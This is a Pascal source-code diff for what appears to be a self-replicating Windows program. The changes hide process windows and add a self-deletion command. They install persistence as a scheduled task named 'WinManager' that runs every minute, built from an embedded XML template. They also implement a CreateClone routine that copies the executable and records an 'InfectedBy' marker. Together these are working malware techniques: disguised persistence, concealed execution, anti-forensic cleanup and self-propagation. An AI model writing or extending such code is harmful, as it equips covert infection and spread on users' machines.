@@ -86,6 +86,7 @@ Begin
   M.Parameters.Add('/C timeout 5 & del /F /Q "'+Base+'\*.*" & rmdir "'+Base+'"');
   M.InheritHandles:=False;
   M.CurrentDirectory:='C:\';
+  M.ShowWindow:=swoHIDE;
   M.Execute;
   M.Free;
 end;
@@ -133,7 +134,7 @@ end;
 
 function Task_AddToStartup: Boolean;
 Begin
-  ScheduleTask('WinManager', Base+'\'+InternalName, 'MINUTE');
+  ScheduleTask('WinManager', Base+'\'+InternalName, '1M');
   Result:=TaskExists('WinManager');
 end;
 
@@ -294,17 +295,46 @@ end;
 procedure ScheduleTask(ATaskName, AFileName, AInterval: String);
 var
   M: TProcess;
+  Res: TResourceStream;
+  S: TStringList;
+  Tmp: String;
+
+procedure Act(Index: LongInt; Pattern, Input: String);
 Begin
+  S.Strings[Index-1]:=StringReplace(S.Strings[Index-1], Pattern, Input, []);
+end;
+
+Begin
+  //Load template
+  Res:=TResourceStream.Create(HInstance, 'NewTask', RT_RCDATA);
+  S:=TStringList.Create;
+  S.LoadFromStream(Res);
+  Res.Free;
+  //Actualize template
+  Act(4, '{DATE_TIME}', FormatDateTime('yyyy-mm-dd"T"h:m:s', Now));
+  Tmp:=GetEnvironmentVariable('Username');
+  Act(5, '{USERNAME}', Tmp);
+  Act(10, '{INTERVAL}', AInterval);
+  Act(13, '{START_DATE_TIME}', FormatDateTime('yyyy-mm-dd"T"h:m:"00"', Now));
+  Act(19, '{COMPUTER_NAME}', GetEnvironmentVariable('ComputerName'));
+  Act(19, '{USERNAME}', Tmp);
+  Act(47, '{COMMAND}', AFileName);
+  //Save XML
+  Tmp:=IncludeTrailingBackslash(GetEnvironmentVariable('Temp'))+'NewTask.xml';
+  S.SaveToFile(Tmp);
+  S.Free;
+  //Add Task
   M:=TProcess.Create(Nil);
   M.Executable:='schtasks';
   M.ShowWindow:=swoHIDE;
   M.Options:=[poWaitOnExit];
   M.Parameters.Add('/Create');
   M.Parameters.Add('/TN "'+ATaskName+'"');
-  M.Parameters.Add('/TR "'+AFileName+'"');
-  M.Parameters.Add('/SC "'+AInterval+'"');
+  M.Parameters.Add('/XML "'+Tmp+'"');
   M.Execute;
   M.Free;
+  //Delete XML
+  DeleteFile(Tmp);
 end;
 
 procedure DeleteTask(ATaskName: String);
@@ -330,7 +360,7 @@ Begin
   M:=TProcess.Create(Nil);
   try
     M.Executable:='schtasks';
-    //M.ShowWindow:=swoHIDE;
+    M.ShowWindow:=swoHIDE;
     M.Options:=[poWaitOnExit, poUsePipes, poStderrToOutPut];
     M.Parameters.Add('/Query');
     M.Parameters.Add('/FO "LIST"');
@@ -405,9 +435,19 @@ begin
   MS.Position:=0;
 end;
 
-procedure CreateClone(CloneName: String);
+function CreateClone(CloneName: String): Boolean;
+var
+  Tmp: String;
 Begin
-
+  Result:=CopyFile(PChar(FullName), PChar(CloneName), False);
+  if Result then Begin
+    Tmp:=Settings.ReadString('General', 'InfectedBy', 'Unknown');
+    Settings.WriteString('General', 'InfectedBy', ID);
+    Settings.WriteInteger('General', 'FirstRun', 1);
+    UpdateResourceSettings(CloneName);
+    Settings.WriteInteger('General', 'FirstRun', 0);
+    Settings.WriteString('General', 'InfectedBy', Tmp);
+  end;
 end;
 
 end.
